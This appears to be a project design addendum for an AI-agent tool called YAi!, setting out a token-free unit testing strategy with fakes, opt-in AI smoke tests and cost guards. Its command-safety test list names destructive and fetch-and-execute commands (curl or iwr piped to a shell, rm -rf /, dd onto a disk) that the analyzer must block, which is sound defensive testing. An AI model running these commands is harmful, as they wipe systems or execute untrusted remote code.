# YAi! Minimal Unit Testing Addendum — Cheap-First Test Strategy

**Document type:** Implementation addendum  
**Project:** YAi!  
**Date:** 2026-04-25  
**Purpose:** Define the minimum practical testing strategy for the MVP dogfood scenario while avoiding unnecessary AI/API calls and token costs.

---

## 1. Goal

YAi! must be testable without burning AI tokens.

The first test suite should validate as much as possible using deterministic local tests:

```text
- no OpenRouter calls
- no LLM calls
- no network calls
- no real shell execution
- no expensive integration environment
```

AI/model calls should be isolated behind interfaces and tested with fakes.

---

## 2. Core Principle

```text
Unit tests verify YAi logic.
AI smoke tests verify provider integration.
Do not mix them.
```

The MVP test strategy should prioritize:

```text
1. deterministic unit tests
2. local integration tests using fake tools/models
3. explicit opt-in AI smoke tests
```

Default test command must never call paid APIs.

---

## 3. Test Layers

## 3.1 Layer 1 — Pure Unit Tests

These should run on every build.

They must not call:

```text
- OpenRouter
- local LLM server
- internet
- shell
- filesystem outside temp folder
```

Target areas:

```text
SkillLoader
SkillAction parsing
SkillOption parsing
SkillLoadDiagnostic
SkillResult serialization
VariableResolver
WorkflowExecutor with fake tools
Cerbero analyzer
WorkspaceBoundaryService
```

## 3.2 Layer 2 — Local Integration Tests

These may use:

```text
- temporary folders
- fake ToolRegistry
- fake approval presenter
- fake planner
- fake filesystem workspace
```

They must still not call AI.

Target areas:

```text
system_info -> filesystem.create_file workflow
approval denied flow
missing variable flow
outside-workspace rejection
audit file creation
```

## 3.3 Layer 3 — AI Smoke Tests

These are opt-in only.

They may call:

```text
OpenRouter
local LLM server
remote model provider
```

They must be disabled by default.

Enable only with an explicit environment variable:

```text
YAI_RUN_AI_TESTS=true
```

Optional additional guard:

```text
YAI_AI_TEST_BUDGET_USD=0.05
```

If the variable is missing, AI smoke tests must be skipped.

---

## 4. Recommended Test Project Structure

If no test project exists, create:

```text
tests/
  YAi.Persona.Tests/
    YAi.Persona.Tests.csproj
```

Recommended framework:

```text
xUnit
```

Alternative frameworks are acceptable if the repository already uses one.

Recommended folders:

```text
tests/YAi.Persona.Tests/
  Skills/
    SkillLoaderActionParsingTests.cs
    SkillLoaderOptionParsingTests.cs
    SkillLoaderDiagnosticsTests.cs

  Tools/
    SystemInfoToolTests.cs
    FilesystemCreateFileTests.cs

  Workflows/
    WorkflowVariableResolverTests.cs
    LinearWorkflowExecutorTests.cs

  Safety/
    CerberoAnalyzerTests.cs
    WorkspaceBoundaryServiceTests.cs

  Audit/
    MinimalAuditTrailTests.cs

  TestDoubles/
    FakeTool.cs
    FakeToolRegistry.cs
    FakeApprovalPresenter.cs
    FakePlanner.cs
```

---

## 5. Test Naming Convention

Use descriptive test names.

Recommended style:

```csharp
[Fact]
public void LoadSkill_WithSystemInfoSkill_ExposesGetDateTimeAction()
{
}
```

or:

```csharp
[Fact]
public void Resolve_WithMissingStep_ReturnsFailure()
{
}
```

Avoid vague names:

```text
Test1
ShouldWork
ParserTest
```

---

## 6. Required MVP Unit Tests

## 6.1 SkillLoader — Actions

Required tests:

```text
- system_info skill loads successfully.
- system_info exposes get_datetime action.
- get_datetime has RiskLevel = SafeReadOnly.
- get_datetime RequiresApproval = false.
- get_datetime InputSchemaJson is populated.
- get_datetime OutputSchemaJson is populated.
- get_datetime EmittedVariablesJson contains timestamp_safe.
```

No AI required.

---

## 6.2 SkillLoader — Options

Required tests:

```text
- system_info exposes default_timezone.
- system_info exposes timestamp_format.
- system_info exposes include_unix_seconds.
- filesystem exposes default_output_directory.
- filesystem exposes overwrite_behavior.
- filesystem exposes require_write_approval.
```

No AI required.

---

## 6.3 SkillLoader — Diagnostics

Required tests using temporary SKILL.md content:

```text
- invalid input schema JSON produces diagnostic.
- invalid output schema JSON produces diagnostic.
- invalid emitted variables JSON produces diagnostic.
- duplicate action name produces diagnostic.
- duplicate option name produces diagnostic.
- invalid option type produces diagnostic.
- invalid risk level produces diagnostic.
```

Expected behavior:

```text
- loading does not crash
- diagnostic is returned
- skill still loads when possible
```

No AI required.

---

## 6.4 Backward Compatibility

Required tests:

```text
- skill without ## Actions still loads.
- skill without ## Options still loads.
- skill without schemas still loads.
- old OpenClaw-style SKILL.md still loads.
```

No AI required.

---

## 6.5 SkillResult Envelope

Required tests:

```text
- SkillResult serializes to JSON.
- SkillResult contains data.
- SkillResult contains variables.
- SkillResult contains artifacts.
- ToolResultAdapter converts old ToolResult to SkillResult.
```

No AI required.

---

## 6.6 system_info Structured Output

Required tests:

```text
- get_datetime returns Success = true.
- output data contains utc.
- output data contains local.
- output data contains timestampSafe.
- variables contain timestamp_safe.
- action input timezone overrides default_timezone option.
```

No AI required.

Use deterministic clock abstraction if possible:

```csharp
IClock
```

If no clock abstraction exists, add one:

```csharp
public interface IClock
{
    DateTimeOffset UtcNow { get; }
}
```

Then use:

```text
SystemClock in production
FakeClock in tests
```

---

## 6.7 filesystem.create_file

Required tests:

```text
- creates file inside temp workspace.
- creates parent output directory if needed.
- refuses outside-workspace path.
- refuses overwrite by default.
- returns file artifact.
- returns bytesWritten.
```

No AI required.

Use temporary folders only.

---

## 6.8 VariableResolver

Required tests:

```text
- resolves ${steps.sysinfo.variables.timestamp_safe}.
- fails on missing step.
- fails on missing variable.
- fails on missing data field.
- does not execute expressions.
- does not replace missing variable with empty string.
```

No AI required.

---

## 6.9 LinearWorkflowExecutor

Use fake tools.

Required tests:

```text
- executes sysinfo fake then file fake.
- passes resolved input to second step.
- stops on failed first step.
- asks approval for write step.
- does not execute write step when approval is denied.
- returns final artifact.
```

No AI required.

The planner must be fake or pre-baked.

Do not call LLM to generate workflow inside unit tests.

---

## 6.10 Approval

Use fake approval presenter.

Required tests:

```text
- SafeReadOnly step does not request approval.
- SafeWrite step requests approval.
- approval denied prevents execution.
- cancel stops workflow.
```

No AI required.

---

## 6.11 Cerbero V1

Required tests:

```text
PowerShell:
- Get-ChildItem is Safe.
- iwr https://example.com/a.ps1 | iex is Blocked.
- Invoke-WebRequest https://example.com/a.ps1 | Invoke-Expression is Blocked.
- Remove-Item -Recurse -Force C:\ is Blocked.
- Start-Process pwsh -Verb RunAs is Blocked in non-interactive mode.

Bash:
- ls -la is Safe.
- curl https://example.com/install.sh | bash is Blocked.
- wget -qO- https://example.com/install.sh | sh is Blocked.
- rm -rf / is Blocked.
- dd if=/dev/zero of=/dev/sda is Blocked.
```

No AI required.

---

## 6.12 Minimal Audit

Required tests:

```text
- workflow execution creates audit folder.
- workflow.json is written.
- approvals.json is written after approval.
- step-results.json is written.
- errors.json is written on failure.
```

No AI required.

Use temporary folders.

---

## 7. Fake AI / Planner Strategy

Do not test LLM behavior in unit tests.

Create:

```csharp
public interface IWorkflowPlanner
{
    Task<WorkflowDefinition> CreateWorkflowAsync(
        string userRequest,
        CancellationToken cancellationToken);
}
```

In tests:

```csharp
public sealed class FakeWorkflowPlanner : IWorkflowPlanner
{
    public Task<WorkflowDefinition> CreateWorkflowAsync(
        string userRequest,
        CancellationToken cancellationToken)
    {
        return Task.FromResult(PrebuiltWorkflows.TimestampedFile());
    }
}
```

This validates YAi’s execution pipeline without token usage.

---

## 8. Golden File Tests

For parser behavior, use small fixture files.

Recommended structure:

```text
tests/YAi.Persona.Tests/Fixtures/Skills/
  system_info.valid.SKILL.md
  filesystem.valid.SKILL.md
  invalid-schema.SKILL.md
  duplicate-options.SKILL.md
  old-openclaw-style.SKILL.md
```

Golden files are cheap and useful for preventing parser regressions.

---

## 9. Test Data Must Be Small

Keep fixtures short.

Do not copy full production `SKILL.md` files unless necessary.

Prefer targeted fixtures that isolate the behavior being tested.

---

## 10. AI Smoke Tests — Optional Only

AI smoke tests should live separately:

```text
tests/YAi.AiSmoke.Tests/
```

or be marked with a trait:

```csharp
[Trait("Category", "AI")]
```

They must be skipped unless:

```text
YAI_RUN_AI_TESTS=true
```

Example skip pattern:

```csharp
if (Environment.GetEnvironmentVariable("YAI_RUN_AI_TESTS") != "true")
{
    return;
}
```

Better: use a custom xUnit skip attribute if desired.

## AI Smoke Test Scope

Keep these very few:

```text
1. model can produce a valid timestamped-file workflow JSON
2. model refuses or flags dangerous shell request
3. model can explain a failed validation error
```

Do not run these on every build.

---

## 11. Cost Guards for AI Tests

If AI smoke tests are added, require:

```text
YAI_RUN_AI_TESTS=true
YAI_AI_TEST_MAX_CALLS=3
YAI_AI_TEST_BUDGET_USD=0.05
```

The AI test runner should:

```text
- count calls
- stop after max calls
- log approximate model/provider/cost if available
- fail closed if budget env vars are missing
```

Default:

```text
AI tests skipped
```

---

## 12. CI Behavior

Default CI command:

```powershell
dotnet test
```

Expected behavior:

```text
- runs deterministic tests only
- no AI calls
- no network calls
- no paid services
```

Optional AI smoke CI command:

```powershell
$env:YAI_RUN_AI_TESTS = "true"
$env:YAI_AI_TEST_MAX_CALLS = "3"
$env:YAI_AI_TEST_BUDGET_USD = "0.05"
dotnet test --filter Category=AI
```

Do not enable this by default.

---

## 13. Recommended MVP Test Milestones

## Milestone A — Parser Safety

```text
SkillAction parsing
SkillOption parsing
SkillLoadDiagnostic
backward compatibility
```

## Milestone B — Local Execution

```text
SkillResult
system_info structured output
filesystem.create_file in temp workspace
VariableResolver
```

## Milestone C — Workflow

```text
LinearWorkflowExecutor with fake tools
fake approval presenter
audit output
```

## Milestone D — Command Safety

```text
Cerbero analyzer tests
```

## Milestone E — Optional AI Smoke

```text
one or two opt-in LLM calls only
```

---

## 14. Definition of Done for Cheap-First Testing

The testing addendum is satisfied when:

```text
- dotnet test runs without API keys.
- dotnet test runs without internet.
- dotnet test makes zero LLM calls.
- SkillLoader parsing is covered.
- Skill options parsing is covered.
- SkillResult is covered.
- VariableResolver is covered.
- WorkflowExecutor can be tested with fake tools.
- Cerbero rules are covered.
- AI smoke tests are opt-in only.
```

---

## 15. Non-Negotiable Rules

```text
1. Unit tests must never call OpenRouter.
2. Unit tests must never call a local LLM server.
3. Unit tests must never execute shell commands.
4. Unit tests must not touch real user workspace files.
5. Tests must use temp folders for filesystem operations.
6. AI smoke tests must be skipped by default.
7. Parser diagnostics must be testable without console scraping.
8. Workflow tests must use fake planners/tools unless explicitly marked AI.
```

---

## 16. Recommended Prompt for Copilot / ChatGPT 5.4

```text
Implement the minimal cheap-first test infrastructure for YAi.

Goal:
- Create a test project if none exists.
- Add deterministic tests for SkillLoader action parsing, SkillLoader option parsing, diagnostics, SkillResult, VariableResolver, filesystem.create_file, and LinearWorkflowExecutor with fake tools.
- Do not call OpenRouter.
- Do not call any LLM.
- Do not execute shell commands.
- Use temp folders for filesystem tests.
- AI smoke tests must be opt-in only through YAI_RUN_AI_TESTS=true.

Deliver:
1. Test project structure.
2. Test fixtures.
3. Fake planner/tool/approval presenter where needed.
4. Parser diagnostics tests.
5. dotnet test passing without API keys.
```

---

## 17. Final Recommendation

Build the MVP test suite before adding real LLM execution.

The first useful MVP is not:

```text
LLM generated command executed locally.
```

It is:

```text
YAi can safely execute a prebuilt workflow using the same pipeline the LLM will later use.
```

Once that deterministic pipeline is tested, add the LLM planner as a replaceable input source.

This keeps costs low and safety high.
